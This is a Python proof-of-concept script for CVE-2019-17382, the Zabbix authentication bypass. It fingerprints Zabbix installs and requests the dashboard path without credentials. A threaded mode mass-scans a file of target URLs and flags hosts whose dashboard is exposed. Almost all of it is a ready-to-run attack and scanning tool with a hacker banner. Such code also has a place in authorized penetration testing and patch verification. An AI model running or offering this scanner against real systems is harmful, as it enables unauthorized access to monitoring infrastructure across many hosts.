#!/bin/python3

import requests
import argparse
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
from alive_progress import alive_bar
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning
from rich.console import Console

color = Console()
disable_warnings(InsecureRequestWarning)
headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 4.4.2; GT-I9500 Build/KOT49H) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36'
}

def ascii_art():
    print("")
    color.print("[yellow]░█▀▀█ ░█──░█ ░█▀▀▀ ── █▀█ █▀▀█ ▄█─ ▄▀▀▄ ── ▄█─ ▀▀▀█ █▀▀█ ▄▀▀▄ █▀█[/yellow]")
    color.print("[yellow]░█─── ─░█░█─ ░█▀▀▀ ▀▀ ─▄▀ █▄▀█ ─█─ ▀▄▄█ ▀▀ ─█─ ──█─ ──▀▄ ▄▀▀▄ ─▄▀[/yellow]") 
    color.print("[yellow]░█▄▄█ ──▀▄▀─ ░█▄▄▄ ── █▄▄ █▄▄█ ▄█▄ ─▄▄▀ ── ▄█▄ ─▐▌─ █▄▄█ ▀▄▄▀ █▄▄[/yellow]")
    print("")
    print("Coded by: K3ysTr0K3R --> Hello Friend :)")
    print("")

def CVE_2019_17382_detection(target):
    paths_to_identify_zabbix = ['/', '/zabbix/']
    detect_zabbix = "Zabbix"
    vuln_path = "/zabbix.php?action=dashboard.view&dashboardid=1"
    for path in paths_to_identify_zabbix:
        retrieve_zabbix = requests.get(target + path, headers=headers, timeout=5, verify=False).text
    if detect_zabbix in retrieve_zabbix:
        check_vuln = requests.get(target + "/zabbix" + vuln_path, headers=headers, timeout=5, verify=False)
        if check_vuln.status_code == 200:
            confirm_bypass = "Dashboard"
            if confirm_bypass in check_vuln.text:
                color.print(f"[green][+][/green] {target}/zabbix{vuln_path} - is vulnerable to [green]CVE-2019-17382[green]")

def progress_bar(target):
    try:
        CVE_2019_17382_detection(target)
    except Exception:
        pass

def CVE_2019_17382_scanner(target_file, num_threads):
    completed_tasks = []
    failed_tasks = []

    try:
        with open(target_file, 'r') as url_file:
            urls = [url.strip() for url in url_file]
            if not urls:
                print("[ERROR] No targets found in the file.")
                return
            with alive_bar(len(urls), title='Scanning Targets', bar='smooth', enrich_print=False) as bar:
                with ThreadPoolExecutor(max_workers=num_threads) as executor:
                    future_to_url = {executor.submit(CVE_2019_17382_detection, url): url for url in urls}
                    for future in concurrent.futures.as_completed(future_to_url):
                        url = future_to_url[future]
                        try:
                            future.result()
                            completed_tasks.append(url)
                        except Exception:
                            failed_tasks.append(url)
                        bar()
    except FileNotFoundError:
        print("[ERROR] That file does not exist.")
        exit()

if __name__ == "__main__":
    ascii_art()
    parser = argparse.ArgumentParser(description="CVE-2019-17382 - A PoC for Zabbix Authentication Bypass")
    parser.add_argument("-u", "--url", help="Single URL to scan")
    parser.add_argument("-f", "--file", help="File containing multiple URLs to scan")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads you wish to add")

    args = parser.parse_args()
    if args.url:
        CVE_2019_17382_detection(args.url)
    elif args.file:
        CVE_2019_17382_scanner(args.file, args.threads)
    else:
        parser.print_help()
